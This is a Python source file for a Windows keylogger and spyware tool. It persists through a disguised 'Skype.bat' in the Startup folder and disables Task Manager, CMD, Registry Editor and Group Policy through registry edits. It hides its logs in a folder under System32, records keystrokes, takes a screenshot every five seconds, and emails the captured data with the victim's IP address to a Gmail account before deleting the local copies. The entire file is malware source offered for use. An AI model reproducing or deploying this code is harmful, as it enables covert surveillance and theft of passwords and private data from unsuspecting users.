"""-------------------------------------------------------        LIBRARIES       -----------------------------------------------------------------"""

# GETTING RELATIVE PATHS
import sys
import os
from os.path import expanduser

# --------------------------------------------------------

# FOR THE CHECKUPS AND USING WINDOWS COMMANDS ON SHELL

import winreg as reg
from win32com.shell import shell as shell
from platform import system
import ctypes
import getpass


# --------------------------------------------------------

# GETTING THE PROCESS TIME
# import datetime# import time
from time import sleep as s

# ---------------------------------------------------------

# GETTING USER'S IPV6 ADDRESS
import urllib.request

# ----------------------------------------------------------

# SENDING AN EMAIL
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import mimetypes
import email.mime.application

from email.mime.base import MIMEBase
from email import encoders
from email.mime.image import MIMEImage

# ---------------------------------------------------------

# KEYLOGGER LIBRARIES
import pynput
from pynput.keyboard import Key, Listener
import logging

# --------------------------------------------------------------

# THREADING
import threading
from threading import Thread

# --------------------------------------------------------------

# BACKDOOR LIBRARIES, CLIENT
import socket
import subprocess

# --------------------------------------------------------------

# TAKE SCREENSHOTS
import pyautogui

"""-------------------------------------------------------       CHECKS      -----------------------------------------------------------------"""


# ADD TO STARTUP

USER_NAME = getpass.getuser()
def AddToRegistry(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = (
        r"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\Programs\\Startup"
        % USER_NAME
    )
    with open(bat_path + "\\" + "Skype.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


# ---------------------

class disablecheck:

    # DISABLE TASK MANAGER
    def task(self):
        os.system(
            "REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
        )


    # DISABLE CMD
    def cmd(self):
        os.system(
            "REG add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f"
        )


    # DISABLE REGEDIT
    def regedit(self):
        os.system(
            'REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 0'
        )


    # DISABLE GROUP POLICY
    def grouppolicy(self):
        os.system(
            'REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f'
        )


"""-------------------------------------------------------       EXPLOITS      -----------------------------------------------------------------"""


general_path = expanduser("~")

# TAKE SCREENSHOTS
def takescreenshot(screenshotpath):
    screenshot_index = 0
    while 1:
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f"{screenshotpath}/{screenshot_index}.png")
        screenshot_index += 1
        s(5)

# --------------------

# GET IPV6 ADDRESS
def getip():
    external_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
    return external_ip


# --------------------

# KEYLOGGER
class keylogger(Thread):
    def __init__(self, path):

        self.path = path
        self.keylog_index = 1
        self.Keys = []


    def on_press(self, key):

        self.KEY = pynput.keyboard.Key  # --> Getting keys

        if key == self.KEY.backspace:
            self.Keys.append(" [Back] ")
        elif key == self.KEY.tab:
            self.Keys.append(" [Tab] ")
        elif key == self.KEY.enter:
            self.Keys.append(" [Enter] ")
        elif key == self.KEY.space:
            self.Keys.append(" [Space] ")
        elif (
            type(key) == self.KEY
        ):  # if the character is some other type of special key  #--> Checking keys here
            self.Keys.append(" [" + str(key)[4:] + "] ")
        else:
            self.Keys.append(key)

        def savefile():
            file_location = self.path + f"/keylog{self.keylog_index}.txt"
            with open(file_location, "w", encoding="utf-8") as f:  # --> Saving Keys
                for i in self.Keys:
                    f.write(str(i))

        # DETERMINE WHEN YOU WANT THE KEYS TO SAVE TO A FILE
        if len(self.Keys) >= 20:          
            savefile()
            self.keylog_index += 1
            self.Keys.clear()


    def logger(self):

        file_location = self.path + f"/keylog{self.keylog_index}.txt"
        logging.basicConfig(
            filename=(file_location), level=logging.DEBUG, format="%(message)s")

        with Listener(on_press=self.on_press) as listener:
            listener.join()

        with open(file_location, "w", encoding="utf-8") as f:
            for i in self.Keys:
                f.write(str(i))


    def run(self):

        self.t1 = threading.Thread(target=self.logger, args=())
        self.t1.start()


# --------------------

# SENDING AN EMAIL
class Email:

    get_ip = getip()

    def __init__(self, path):
        self.email = "YourEmail"
        self.password = "YourPassword"
        self.path = path

        self.msg = MIMEMultipart()
        self.subject = self.msg["Subject"] = self.get_ip
        self.msg["From"] = "YourEmail"
        self.msg["To"] = "OptionalEmail"
        self.body = "Optinoal"

    def addattachment(self):
        for files in os.listdir(self.path):
            if files.lower().endswith("txt"):
                self.msg.attach(MIMEText(self.body, "plain", "utf-8"))
                filename = files
                attachment = open(f"{self.path}\\{files}", "rb")

                p = MIMEBase("application", "octet-stream")
                p.set_payload((attachment).read())

                encoders.encode_base64(p)

                p.add_header(
                    "Content-Disposition", "attachment; filename= %s" % filename
                )
                self.msg.attach(p)
                attachment.close()

            elif (files.lower().endswith("png")):
                fp = open(f"{self.path}\\{files}", 'rb')
                img = MIMEImage(fp.read(), _subtype="png")
                fp.close()
                img.add_header("Content-ID", "attachment; filename= %s" % files)
                self.msg.attach(img)

            else:
                print("bruh")



    def send(self):

        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.starttls()
        s.login(self.email, self.password)
        s.sendmail(self.email, self.email, self.msg.as_string())
        s.quit()

    
    def run(self):
        t1 = threading.Thread(target=self.addattachment)
        t2 = threading.Thread(target=self.send)

        t1.start()
        t1.join()
        t2.start()


"""-------------------------------------------------------        RUNNING        -----------------------------------------------------------------"""


# GET THE SYSTEM NAME
def getsystem():
    return system()


# MAKE IT INFALLIABLE
if getsystem().lower() == "windows":

    # DIRECTORIES
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    system32_path = os.path.join(os.path.join(str(os.path.expanduser("~"))[0:3], "Windows\\System32"))
    try:
        exploit_path = os.mkdir(os.path.join(str(system32_path), "\\VHVybkJhY2tOb3c="))
    except:
        pass
    exploit_path = expanduser(system32_path + "\\VHVybkJhY2tOb3c=")
    ctypes.windll.kernel32.SetFileAttributesW(exploit_path, 2)  # HIDING OUR DIRECTORY

    # ADDING TO STARTUP
    AddToRegistry()

    # DISABLING REGEDIT, TASK MANAGER, GROUP POLICY AND CMD
    disable = disablecheck()
    disable.cmd()
    disable.grouppolicy()
    disable.regedit()
    disable.task()

    logger = keylogger(exploit_path)  # KEYLOGGER OBJECT
    mail = Email(exploit_path)        # EMAIL OBJECT

    logger.run()
    threading.Thread(target=takescreenshot, args=(exploit_path,)).start()


    def sendemail():
        while True:
            check = os.listdir(exploit_path)
            count = 0
            for keylogs in check:
                if keylogs.startswith("keylog"):
                    count += 1
                else:
                    continue

            if count >= 5:
                mail.run()
            
                for check in os.listdir(exploit_path):
                    try:
                        os.remove(f"{exploit_path}\\{check}")
                        s(0.1)
                    except:
                        continue

            else:
                continue

            s(5)

    threading.Thread(target = sendemail).start()
